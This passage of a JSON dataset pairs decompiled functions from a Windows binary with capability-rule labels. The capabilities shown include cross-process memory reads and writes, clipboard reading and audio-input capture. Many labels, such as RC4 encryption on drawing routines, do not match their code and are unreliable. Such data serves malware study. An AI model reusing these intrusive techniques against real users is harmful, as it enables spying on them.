        "decompiled_code": "\nuint __fastcall fcn.0048bf48(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack28;\n    uint uStack20;\n    \n    uVar5 = 0;\n    uStack20 = 0;\n    iVar4 = 0;\n    puStack36 = &uStack20;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 1;\n    uStack52 = in_EAX;\n    uStack28 = param_2;\n    iVar1 = sub.advapi32.dll_GetTokenInformation();\n    if (iVar1 == 0) {\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        if (iVar1 != 0x7a) {\n            return 0;\n        }\n        uVar2 = sub.kernel32.dll_GetProcessHeap(8, uStack40);\n        iVar4 = sub.kernel32.dll_HeapAlloc(uVar2);\n        uVar3 = uStack52;\n        if (iVar4 == 0) {\n            return 0;\n        }\n        uStack52 = 0;\n        iVar1 = sub.advapi32.dll_GetTokenInformation(uVar2, 1, iVar4, uVar3, &uStack52);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    iVar1 = fcn.0048bd7c();\n    if (iVar1 != 0) {\n        uVar3 = sub.kernel32.dll_GetProcessHeap(0, iVar4);\n        iVar1 = sub.kernel32.dll_HeapFree(uVar3);\n        if (iVar1 != 0) {\n            uVar5 = 0xffffffff;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 439
    },
    "0048bff8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048bff8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_fffffecc;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uchar auStack280 [272];\n    \n    puStack284 = 0x48c009;\n    fcn.00405530();\n    uStack288 = 0xffffffff;\n    uStack292 = 8;\n    uStack296 = 0x48c013;\n    puStack284 = &stack0xfffffee8;\n    uStack296 = sub.kernel32.dll_GetCurrentThread();\n    iVar1 = sub.advapi32.dll_OpenThreadToken();\n    if (iVar1 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0x3f0) {\n            in_stack_fffffecc = sub.kernel32.dll_GetCurrentProcess(8, &stack0xfffffed8);\n            iVar1 = sub.advapi32.dll_OpenProcessToken(in_stack_fffffecc);\n        }\n    }\n    if (iVar1 != 0) {\n        fcn.00403af4();\n        iVar1 = fcn.0048bf48();\n        if (iVar1 != 0) {\n            fcn.004057a0();\n        }\n        sub.kernel32.dll_CloseHandle_1(in_stack_fffffecc);\n    }\n    return;\n}\n",
        "token_count": 315
    },
    "0048c354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get memory capacity"
        ],
        "decompiled_code": "\nvoid fcn.0048c354(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack88;\n    int32_t iStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpBuffer;\n    uint var_20h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack80 = &stack0xfffffffc;\n    var_28h = 0;\n    uStack72 = 0x48c3f5;\n    iStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iStack84 = 0x48c3c8;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    lpBuffer = 0x20;\n    sub.kernel32.dll_GlobalMemoryStatus(&fcn.0048c354::lpBuffer);\n    arg_8h = &fcn.0048c354::var_28h;\n    fcn.0040af88(arg_8h);\n    fcn.00405864();\n    *in_FS_OFFSET = arg_8h;\n    *in_FS_OFFSET = iStack84;\n    iStack76 = 0x48c3fc;\n    puStack80 = 0x48c3f4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 347
    },
    "0048c428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.0048c428(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48c443;\n    fcn.004059cc();\n    uStack32 = 0x48c4b9;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(10);\n    uVar1 = sub.kernel32.dll_FindResourceA(0, uVar1);\n    uVar2 = sub.kernel32.dll_LoadResource(0, uVar1);\n    sub.kernel32.dll_SizeofResource(0, uVar1);\n    sub.kernel32.dll_LockResource(uVar2);\n    fcn.00405620();\n    fcn.00405584();\n    sub.kernel32.dll_FreeResource();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48c4c0);\n    return;\n}\n",
        "token_count": 264
    },
    "0048c534": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048c534(uint param_1, char param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack36 = 0x48c547;\n        fcn.00404974();\n    }\n    uStack40 = 0x48c582;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0048a574();\n    fcn.00405584();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x48c589;\n    uStack40 = 0x48c581;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 198
    },
    "0048c6b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "find graphical window",
            "write process memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048c6b4(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uVar6;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t wParam;\n    uint hWndParent;\n    uint lpdwProcessId;\n    uint lpNumberOfBytesWritten;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    puStack72 = 0x48c6df;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack72 = 0x48c6e7;\n    fcn.004059cc();\n    uStack76 = 0x48c8bb;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.0048c638();\n    uVar1 = fcn.004059dc();\n    uVar1 = sub.user32.dll_FindWindowA(0x48c8cc, uVar1);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48c8cc, 0);\n    uVar2 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48c8d4, 0);\n    uVar1 = uVar2;\n    var_20h = sub.user32.dll_SendMessageA(uVar2, 0x1004, 0, 0);\n    if (-1 < var_20h + -1) {\n        wParam = 0;\n        do {\n            puVar3 = sub.kernel32.dll_VirtualAlloc_1(0, 300, 0x3000, 4);\n            sub.user32.dll_GetWindowThreadProcessId(uVar2, &fcn.0048c6b4::lpdwProcessId);\n            uVar1 = sub.kernel32.dll_OpenProcess(0x38, 0, lpdwProcessId);\n            iVar4 = sub.kernel32.dll_VirtualAllocEx(uVar1, 0, 300, 0x3000, 4);\n            *puVar3 = 1;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[5] = iVar4 + 0x28;\n            puVar3[6] = 100;\n            sub.kernel32.dll_WriteProcessMemory(uVar1, iVar4, puVar3, 0x400, &fcn.0048c6b4::lpNumberOfBytesWritten);\n            sub.user32.dll_SendMessageA(uVar2, 0x102d, wParam, iVar4);\n            uVar6 = uVar1;\n            sub.kernel32.dll_ReadProcessMemory();\n            uVar5 = puVar3 == 0xffffffd8;\n            fcn.00405728();\n            fcn.00409b6c();\n            fcn.00409b6c(0);\n            fcn.00405974();\n            if (uVar5) {\ncode_r0x0048c852:\n                uVar6 = uVar2;\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                fcn.00409b6c();\n                fcn.00409b6c(0);\n                fcn.00405974();\n                if (uVar5) goto code_r0x0048c852;\n            }\n            sub.kernel32.dll_VirtualFree_1(puVar3, 0, 0x8000, uVar6);\n            sub.kernel32.dll_VirtualFreeEx(uVar1, iVar4, 0, 0x8000);\n            sub.kernel32.dll_CloseHandle_1();\n            wParam = wParam + 1;\n            var_20h = var_20h + -1;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x48c8c2);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 985
    },
    "00420ed4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420ed4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420f37;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch != 0) {\n        *(arg_ch + 4) = 2;\n        uVar1 = (****(arg_8h + 0xc))();\n        *(arg_ch + 8) = uVar1;\n        *(arg_ch + 0xc) = uVar1 >> 0x20;\n        *(arg_ch + 0x10) = 0;\n        *(arg_ch + 0x14) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 0;\n        *(arg_ch + 0x2c) = 1;\n    }\n    *in_FS_OFFSET = uStack28;\n    return 0;\n}\n",
        "token_count": 293
    },
    "0042514c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.0042514c(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.00419c0c();\n    fcn.0042571c();\n    fcn.00404650();\n    fcn.00404650();\n    fcn.00404650();\n    sub.kernel32.dll_DeleteCriticalSection(iVar1 + 0x38);\n    fcn.00419e04();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "004252dc": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004252dc(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00425770();\n    uVar1 = fcn.00424f6c();\n    sub.user32.dll_FillRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 110
    },
    "004253a4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004253a4(int32_t *param_1)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 != NULL) {\n        (**(*in_EAX + 0x10))();\n        fcn.00425770();\n        (**(*param_1 + 0x14))();\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "00427264": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427264(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00404650();\n        *(in_EAX + 0xc) = 0;\n        iVar2 = (**(param_2 + 0x48))();\n        *(in_EAX + 0xc) = iVar2;\n        *(iVar2 + 0x14) = in_EAX;\n        uVar3 = fcn.00404864();\n        *(iVar2 + 0x10) = uVar3;\n        *(iVar2 + 0x1c) = in_EAX;\n        uVar3 = fcn.00404864();\n        *(iVar2 + 0x18) = uVar3;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0044d804": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d804(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 8) = *(param_2 + 8);\n    *(in_EAX + 0xc) = *(param_2 + 0xc);\n    *(in_EAX + 0x10) = *(param_2 + 0x10);\n    *(in_EAX + 0x14) = *(param_2 + 0x14);\n    *(in_EAX + 0x18) = *(param_2 + 0x18);\n    *(in_EAX + 0x1c) = *(param_2 + 0x1c);\n    *(in_EAX + 0x28) = *(param_2 + 0x28);\n    *(in_EAX + 0x2c) = *(param_2 + 0x2c);\n    *(in_EAX + 0x30) = *(param_2 + 0x30);\n    *(in_EAX + 0x34) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 255
    },
    "00454a74": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454a74(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0040856c(*(param_2 + 0x20), *(param_2 + 0x34), 0, *(param_2 + 0x1c), *(param_2 + 0x18), \n                         *(param_2 + 0x14), *(param_2 + 0x10), *(param_2 + 0xc), *(param_2 + 4));\n    *(in_EAX + 0x1b4) = uVar1;\n    return;\n}\n",
        "token_count": 156
    },
    "00466b9c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * fcn.00466b9c(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.00402f00();\n    fcn.00466114();\n    uVar2 = fcn.00402f00();\n    *puVar1 = uVar2;\n    puVar1[1] = *(in_EAX + 0xc);\n    puVar1[2] = 0;\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    iVar3 = sub.winmm.dll_waveInPrepareHeader(*(in_EAX + 0x94), puVar1, 0x20);\n    if (iVar3 == 0) {\n        sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), puVar1, 0x20);\n    }\n    return puVar1;\n}\n",
        "token_count": 215
    },
    "00403770": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00403770(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00403af4();\n    *(in_EAX + 0x14) = in_EAX + 0x14c;\n    *(in_EAX + 4) = 0xd7b0;\n    *(in_EAX + 6) = *0x48f034;\n    *(in_EAX + 8) = 0x80;\n    *(in_EAX + 0x18) = 0x4035c4;\n    uVar1 = fcn.0040580c();\n    fcn.004059dc(uVar1);\n    fcn.004030fc();\n    iVar2 = fcn.0040580c();\n    *(in_EAX + 0x48 + iVar2) = 0;\n    return 0;\n}\n",
        "token_count": 201
    },
    "004052cc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nbool fcn.004052cc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    iVar1 = *0x48f000;\n    *0x48f000 = 0;\n    puVar3 = *0x4957c8;\n    puVar4 = 0x4957c8;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 172
    },
    "0040f750": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f750(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x14), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 55
    },
    "004272e0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004272e0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (param_2 != 0) {\n        piStack24 = 0x4272fb;\n        iVar1 = fcn.00404528();\n        piStack24 = 0x427300;\n        var_4h = (**(iVar1 + 0x48))();\n        piStack24 = 0x42730d;\n        (**(*var_4h + 8))();\n        var_4h[5] = in_EAX;\n        uStack28 = 0x42731f;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404864();\n        piStack24[4] = iVar1;\n        var_4h[7] = in_EAX;\n        uStack28 = 0x427337;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404864();\n        piStack24[6] = iVar1;\n    }\n    uStack28 = 0x427370;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    piStack24 = &stack0xfffffffc;\n    fcn.00404650();\n    *(in_EAX + 0xc) = var_4h;\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 379
    },
    "0042c2b0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c2b0(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x42c3a0;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_14h = 0;\n    fcn.0040700c();\n    iVar1 = sub.oleaut32.dll_GetErrorInfo();\n    if (iVar1 == 0) {\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x10))();\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x14))();\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x18))();\n        uStack96 = 0;\n        uStack100 = 0x42c32d;\n        (**(_pe_dos_header + 0x1c))();\n    }\n    fcn.004057d4();\n    fcn.004057d4();\n    fcn.004057d4();\n    iStack104 = fcn.0042bc4c(var_14h, var_1ch, var_18h, in_EAX);\n    uStack108 = var_14h;\n    if (iStack104 == 0) {\n        iStack104 = fcn.00405470();\n        uStack108 = var_14h;\n    }\n    uStack96 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x493014)(0xeedfade, 1, 7, &stack0xffffff94);\n    return;\n}\n",
        "token_count": 534
    },
    "00431658": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431658(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x43166c;\n    (**(*in_EAX + 0x18))();\n    uStack28 = 0x4316b0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(2);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x4316b7);\n    return;\n}\n",
        "token_count": 218
    },
    "004316c0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004316c0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4316d3;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x431715;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(3);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x43171c);\n    return;\n}\n",
        "token_count": 217
    },
    "0045b1e4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b1e4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    if ((in_ECX == 0) && (in_ECX = *(*(in_EAX + 100) + 8),  iVar1 = in_ECX,  arg_8h != '\\0')) {\n        do {\n            in_ECX = iVar1;\n            iVar1 = *(in_ECX + 0xc);\n        } while (*(in_ECX + 0xc) != 0);\n    }\n    if (arg_8h == '\\0') {\n        *(in_EDX + 0xc) = in_ECX;\n        iVar1 = *(in_ECX + 0x18);\n        *(in_EDX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = in_EDX;\n        }\n        *(in_ECX + 0x18) = in_EDX;\n        iVar1 = *(in_ECX + 0x14);\n        *(in_EDX + 0x14) = iVar1;\n        if (in_ECX == *(iVar1 + 8)) {\n            *(iVar1 + 8) = in_EDX;\n        }\n    }\n    else {\n        *(in_EDX + 0x14) = *(in_ECX + 0x14);\n        *(in_EDX + 0x18) = in_ECX;\n        iVar1 = *(in_ECX + 0xc);\n        *(in_EDX + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = in_EDX;\n        }\n        *(in_ECX + 0xc) = in_EDX;\n    }\n    fcn.0045a6ac();\n    fcn.0045aa44();\n    return;\n}\n",
        "token_count": 435
    },
    "0044dc8c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044dc8c(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if ((in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f) < (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f)) {\n        return in_EAX;\n    }\n    return param_2;\n}\n",
        "token_count": 109
    },
    "0040f740": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f740(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x10), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 55
    },
    "0041f6f4": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0041f6f4(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_WaitForSingleObject(*0x4979b8);\n    if (iVar1 == 0) {\n        fcn.0041f6e8();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0048c988": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0048c988(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x48c9da;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    do {\n        fcn.0046d960();\n        fcn.00482384();\n        uStack20 = 10000;\n        sub.kernel32.dll_Sleep_1();\n    } while( true );\n}\n",
        "token_count": 146
    },
    "0041004c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041004c(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_10h == 0x400) {\n        uVar1 = sub.oleaut32.dll_VariantChangeType(arg_8h, arg_ch, arg_14h, arg_18h);\n    }\n    else {\n        uVar1 = 0x80004001;\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "0041e964": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e964(uint param_1)\n\n{\n    fcn.0041cfd8(param_1);\n    fcn.00405620();\n    fcn.00405a3c();\n    fcn.0041cfd8();\n    return;\n}\n",
        "token_count": 62
    },
    "004202d4": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004202d4(uint param_1, int32_t *param_2)\n\n{\n    uint var_4h;\n    \n    (**(*param_2 + 4))(0x420094);\n    (**(*param_2 + 4))(0x4200a0);\n    return;\n}\n",
        "token_count": 69
    },
    "004251a8": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004251a8(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00425770();\n    fcn.00425770();\n    sub.gdi32.dll_StretchBlt\n              (in_EAX[1], *in_EDX, in_EDX[1], in_EDX[2] - *in_EDX, in_EDX[3] - in_EDX[1], *(in_ECX + 4), *arg_8h, \n               arg_8h[1], arg_8h[2] - *arg_8h, arg_8h[3] - arg_8h[1], in_EAX[8]);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 213
    },
    "004256b8": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004256b8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) != 0) && (*(in_EAX + 8) != (~*0x425714 & *(in_EAX + 8)))) {\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x497a08);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x497a0c);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x497a10);\n        *(in_EAX + 8) = ~*0x425714 & *(in_EAX + 8);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "0042583c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0042583c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.00424c80();\n    sub.gdi32.dll_SelectObject(*(in_EAX + 4), uVar1);\n    sub.gdi32.dll_SetROP2(*(in_EAX + 4), *(*(*(in_EAX + 0x10) + 0x18) * 2 + 0x48fe20));\n    return;\n}\n",
        "token_count": 109
    },
    "00425ed4": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00425ed4(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = 0xff;\n    do {\n        puVar1 = in_EAX + iVar3 * 4;\n        puVar2 = in_EAX + iVar3 * 3;\n        puVar1[2] = puVar2[2];\n        puVar1[1] = puVar2[1];\n        *puVar1 = *puVar2;\n        puVar1[3] = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(in_EAX + 3) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "004382a0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004382a0(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    \n    if (*0x4382d8 == (*0x4382d4 & *(in_EAX + 7))) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00448bd8": {
        "rules": [
